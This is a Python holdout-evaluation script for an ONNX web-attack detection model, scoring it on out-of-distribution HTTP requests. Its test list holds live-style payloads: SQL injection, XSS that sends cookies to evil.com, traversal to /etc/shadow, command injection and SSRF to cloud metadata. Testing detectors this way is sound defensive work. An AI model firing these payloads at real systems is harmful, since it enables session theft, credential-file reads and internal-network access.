"""
ml/evaluation/holdout_eval.py
==============================
True holdout evaluation: tests the exported ONNX models against
out-of-distribution samples that were NEVER seen during training.

This catches URL-template memorisation on CSIC-2010 and validates
that attack detection works across different apps, encodings, and styles.

Usage:
    python holdout_eval.py
    # Expects: ml/exported_models/layer2b_best.onnx to exist
"""
import sys
import os
import numpy as np
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "ml"))
os.environ.setdefault("ML_PATH", str(ROOT / "ml"))

import onnxruntime as ort
import scipy.special

from ml.feature_engineering.tokenizer import CharTokenizer
from ml.feature_engineering.extractor import extract_features, to_vector

# ── Load ONNX model ───────────────────────────────────────────────────────────
MODEL_PATH = ROOT / "ml" / "exported_models" / "layer2b_best.onnx"

CLASS_NAMES = ["normal", "sqli", "xss", "lfi", "other_attack", "cmdi"]

def load_model():
    if not MODEL_PATH.exists():
        print(f"[ERROR] ONNX model not found: {MODEL_PATH}")
        sys.exit(1)
    opts = ort.SessionOptions()
    opts.graph_optimization_level = ort.GraphOptimizationLevel.ORT_ENABLE_ALL
    opts.intra_op_num_threads = 2
    opts.inter_op_num_threads = 1
    opts.execution_mode = ort.ExecutionMode.ORT_SEQUENTIAL
    return ort.InferenceSession(str(MODEL_PATH), sess_options=opts)

def predict(sess, tokenizer, req: dict) -> tuple[str, float]:
    tokens = tokenizer.encode_request(req).reshape(1, -1).astype(np.int64)
    in_name = sess.get_inputs()[0].name
    logits = sess.run(None, {in_name: tokens})[0][0]
    probs = scipy.special.softmax(logits)
    idx = int(np.argmax(probs))
    label = CLASS_NAMES[idx] if idx < len(CLASS_NAMES) else f"class_{idx}"
    return label, float(probs[idx])

# ── Holdout test cases ────────────────────────────────────────────────────────
# These are OUT-OF-DISTRIBUTION: different URL templates, apps, encodings,
# and attack styles than CSIC-2010's /tienda1/publico/*.jsp pattern.

HOLDOUT_TESTS = [
    # ── Normal traffic (should all be "normal") ───────────────────────────────
    ("Normal: REST API GET",
     {"method":"GET",  "url":"/api/v2/products?page=1&limit=20",  "body":"", "headers":{"user-agent":"Mozilla/5.0"}},
     "normal"),
    ("Normal: Login POST",
     {"method":"POST", "url":"/auth/login", "body":'{"email":"user@example.com","password":"abc123"}', "headers":{"content-type":"application/json"}},
     "normal"),
    ("Normal: Static asset",
     {"method":"GET",  "url":"/static/css/main.css", "body":"", "headers":{}},
     "normal"),

    # ── SQLi — different URL templates ────────────────────────────────────────
    ("SQLi: WordPress URL",
     {"method":"GET",  "url":"/wp-admin/admin.php?page=1'+OR+1=1--", "body":"", "headers":{}},
     "sqli"),
    ("SQLi: REST endpoint",
     {"method":"GET",  "url":"/api/users?id=1+UNION+SELECT+username,password+FROM+users--", "body":"", "headers":{}},
     "sqli"),
    ("SQLi: POST body",
     {"method":"POST", "url":"/login", "body":"user=admin'--&pass=x", "headers":{}},
     "sqli"),
    ("SQLi: Double-encoded",
     {"method":"GET",  "url":"/search?q=1%2527%2520OR%25201=1--", "body":"", "headers":{}},
     "sqli"),

    # ── XSS — different templates ─────────────────────────────────────────────
    ("XSS: Comment field",
     {"method":"POST", "url":"/comments", "body":"text=<script>document.cookie='stolen='+document.cookie</script>", "headers":{}},
     "xss"),
    ("XSS: img onerror",
     {"method":"GET",  "url":"/profile?name=<img+src=x+onerror=alert(document.domain)>", "body":"", "headers":{}},
     "xss"),
    ("XSS: SVG injection",
     {"method":"GET",  "url":"/search?q=<svg/onload=fetch('//evil.com/steal?c='+document.cookie)>", "body":"", "headers":{}},
     "xss"),

    # ── LFI ───────────────────────────────────────────────────────────────────
    ("LFI: Django URL",
     {"method":"GET",  "url":"/download?file=../../../../etc/shadow", "body":"", "headers":{}},
     "lfi"),
    ("LFI: Encoded traversal",
     {"method":"GET",  "url":"/view?template=..%2f..%2f..%2fetc%2fpasswd", "body":"", "headers":{}},
     "lfi"),

    # ── CMDi / OSCI ───────────────────────────────────────────────────────────
    ("CMDi: Shell injection",
     {"method":"GET",  "url":"/ping?host=127.0.0.1;cat+/etc/passwd", "body":"", "headers":{}},
     "other_attack"),   # may be cmdi or other_attack depending on model version
    ("CMDi: Backtick",
     {"method":"POST", "url":"/run", "body":"cmd=`id`", "headers":{}},
     "other_attack"),

    # ── SSRF ─────────────────────────────────────────────────────────────────
    ("SSRF: Internal metadata",
     {"method":"GET",  "url":"/fetch?url=http://169.254.169.254/latest/meta-data/", "body":"", "headers":{}},
     "other_attack"),
    ("SSRF: Gopher",
     {"method":"GET",  "url":"/proxy?target=gopher://127.0.0.1:6379/_PING", "body":"", "headers":{}},
     "other_attack"),
]

def run_holdout_eval():
    print("=" * 60)
    print("HOLDOUT EVALUATION — Out-of-Distribution Test")
    print(f"Model: {MODEL_PATH.name}")
    print("=" * 60)

    sess      = load_model()
    tokenizer = CharTokenizer(max_len=256)

    results = {"normal": {"pass":0,"fail":0}, "attack": {"pass":0,"fail":0}}
    rows    = []

    for desc, req, expected in HOLDOUT_TESTS:
        pred, conf = predict(sess, tokenizer, req)

        # For attacks: any non-normal prediction is a pass
        if expected == "normal":
            ok = (pred == "normal")
            cat = "normal"
        else:
            ok = (pred != "normal")
            cat = "attack"

        results[cat]["pass" if ok else "fail"] += 1
        rows.append((desc, expected, pred, conf, ok))

    # ── Print results ─────────────────────────────────────────────────────────
    print(f"\n  {'Test':<42} {'Expected':<14} {'Predicted':<14} {'Conf':>6} {'OK'}")
    print(f"  {'-'*82}")
    for desc, expected, pred, conf, ok in rows:
        sym = "PASS" if ok else "FAIL"
        print(f"  {sym} {desc:<40} {expected:<14} {pred:<14} {conf:>5.2f}")

    print(f"\n  {'-'*82}")
    n_pass  = sum(1 for *_, ok in rows if ok)
    n_total = len(rows)
    n_norm_pass  = results["normal"]["pass"]
    n_norm_total = results["normal"]["pass"] + results["normal"]["fail"]
    n_atk_pass   = results["attack"]["pass"]
    n_atk_total  = results["attack"]["pass"]  + results["attack"]["fail"]

    print(f"  Normal traffic precision : {n_norm_pass}/{n_norm_total} "
          f"({100*n_norm_pass//max(n_norm_total,1)}%)")
    print(f"  Attack detection recall  : {n_atk_pass}/{n_atk_total} "
          f"({100*n_atk_pass//max(n_atk_total,1)}%)")
    print(f"  Overall                  : {n_pass}/{n_total} "
          f"({100*n_pass//n_total}%)")

    if n_atk_pass / max(n_atk_total, 1) < 0.70:
        print("\n  [WARNING] Attack recall < 70% on out-of-distribution data.")
        print("  The model may be overfitting to CSIC-2010 URL templates.")
        print("  Recommended: retrain with multi-source dataset + augmentation.")
    else:
        print("\n  [OK] Model generalises reasonably to out-of-distribution requests.")

    print("=" * 60)
    return n_pass / n_total


if __name__ == "__main__":
    score = run_holdout_eval()
    sys.exit(0 if score >= 0.70 else 1)
